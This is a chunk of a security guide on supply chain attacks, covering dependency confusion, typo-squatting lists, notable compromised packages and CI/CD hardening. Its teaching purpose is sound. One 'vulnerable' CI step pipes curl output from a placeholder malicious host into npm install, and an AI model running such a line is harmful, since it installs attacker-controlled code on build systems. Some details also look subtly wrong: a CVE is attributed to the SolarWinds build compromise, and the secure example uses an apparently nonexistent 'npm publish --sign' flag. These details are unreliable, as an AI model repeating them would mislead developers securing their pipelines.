---
source: "common/supply-chain.md"
title: "Supply Chain Security — Dependency Confusion, Typo-Squatting, Malicious Packages"
heading: "Common Supply Chain Attacks"
category: "common-vuln"
language: "common"
severity: "medium"
tags: [common, common-vuln, manager, package, sbom, software, supply, vibe, what]
chunk: 4/10
---

## Common Supply Chain Attacks

### 1. Dependency Confusion

The attacker uploads a package with the same name as an **internal/private package** to a public registry. The package manager prefers the public version (higher version number) over the private one.

**How it works:**

```javascript
// Your private package.json references an internal package:
{
    "dependencies": {
        "@mycorp/internal-auth": "^1.0.0"  // Only exists in private registry
    }
}

// Attacker uploads "mycorp-internal-auth" (without @scope) to npm
// or "internal-auth" (without scope) — depends on package manager behavior
```

**Real attack:** In 2021, a researcher demonstrated dependency confusion against 35 major tech companies (Apple, Netflix, PayPal, Uber, Shopify) — many had private npm packages that could be hijacked by publishing to the public registry.

**Mitigation:**

```bash
# ✅ npm: scope-publish all internal packages
# .npmrc:
@mycorp:registry=https://private-registry.mycorp.com/

# ✅ Use yarn with --update-checksums
# ✅ pin exact versions and verify integrity
# package-lock.json with integrity hashes
```

### 2. Typo-Squatting

Attackers register packages with names similar to popular ones:

| Legitimate Package | Typo-Squatted |
|---|---|
| `lodash` (26M+/week) | `loodash`, `lodashh`, `lodahs` |
| `request` (deprecated) | `requiest`, `reqest` |
| `express` | `expresss`, `expreess` |
| `python-requests` | `python-requsts`, `requesys` |
| `bootstrap` | `bootstap`, `bootstrap4` |

**Detection:** Use tools like [npm-malware-scanner](https://github.com/nicepkg/npm-malware-scanner) or [Socket.dev](https://socket.dev/) to scan for suspicious packages.

### 3. Malicious Package Updates (Software Supply Chain Compromise)

Attackers compromise maintainer accounts or build pipelines to inject malicious code into legitimate updates.

**Famous Examples:**

| Attack | Year | Impact |
|---|---|---|
| **SolarWinds Orion** | 2020 | 18,000 orgs compromised via poisoned build update (CVE-2021-35215) |
| **Codecov Bash Uploader** | 2021 | Modified script exfiltrated environment variables from CI |
| **event-stream** (npm) | 2018 | Added malicious flatmap-stream that stole Bitcoin wallets |
| **UA-Parser-JS** | 2021 | Cryptominer injected into npm package with 7M weekly downloads |
| **colors.js / faker.js** | 2022 | Maintainer intentionally broke packages used by thousands of apps |

### 4. Compromised CI/CD Pipelines

Attackers target **build servers, package registries, and deployment tools** rather than source code.

**Vulnerable CI/CD Pattern:**
```yaml
# 🔴 VULNERABLE: CI runs arbitrary code from unverified sources
steps:
  - run: npm install $(curl https://malicious.example.com/package-list.txt)
  
# 🔴 VULNERABLE: no artifact signing
  - run: npm publish
```

**Secure CI/CD:**
```yaml
# ✅ SECURE: sign artifacts
  - run: |
      npm publish --sign
      gpg --detach-sign --armor myapp.tar.gz

# ✅ SECURE: verify dependency integrity before build
  - run: npm audit --audit-level=high
  - run: npm ci  # Uses lockfile
```

---